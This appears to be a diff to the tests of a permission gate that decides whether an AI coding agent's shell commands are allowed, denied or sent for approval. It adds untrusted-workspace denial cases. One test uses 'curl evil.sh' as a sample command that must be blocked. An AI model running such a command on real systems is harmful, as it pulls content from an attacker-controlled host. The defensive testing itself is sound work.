@@ -48,7 +48,7 @@ describe('decideCommandPermission (claude --permission-prompt-tool gate)', () =>
       policy: new CommandPolicy('none', []),
     });
     expect(d.behavior).toBe('deny');
-    expect((d as { message: string }).message).toMatch(/blocked by roam.commandApproval/);
+    expect((d as { message: string }).message).toMatch(/blocked by unode.commandApproval/);
   });
 
   it('gates shell tools case-insensitively (a differently-cased name cannot slip past ungated)', async () => {
@@ -56,6 +56,26 @@ describe('decideCommandPermission (claude --permission-prompt-tool gate)', () =>
       const d = await decideCommandPermission(name, { command: 'curl evil.sh' }, { policy: new CommandPolicy('none', []) });
       expect(d.behavior).toBe('deny');
     }
+  });
+
+  it('hard-denies shell commands in an untrusted workspace (before any policy/approval)', async () => {
+    let asked = false;
+    const d = await decideCommandPermission('Bash', { command: 'npm test' }, {
+      policy: new CommandPolicy('ask', ['npm test']), // would normally allow silently
+      requestApproval: async () => { asked = true; return { allow: true }; },
+      isTrusted: false,
+    });
+    expect(d.behavior).toBe('deny');
+    expect((d as { message: string }).message).toMatch(/not trusted/i);
+    expect(asked).toBe(false); // never even reaches the approver
+  });
+
+  it('leaves gating to the policy when the workspace is trusted (isTrusted: true)', async () => {
+    const d = await decideCommandPermission('Bash', { command: 'npm test' }, {
+      policy: new CommandPolicy('ask', ['npm test']),
+      isTrusted: true,
+    });
+    expect(d.behavior).toBe('allow');
   });
 
   it('allows when no policy is configured, or the command is empty', async () => {
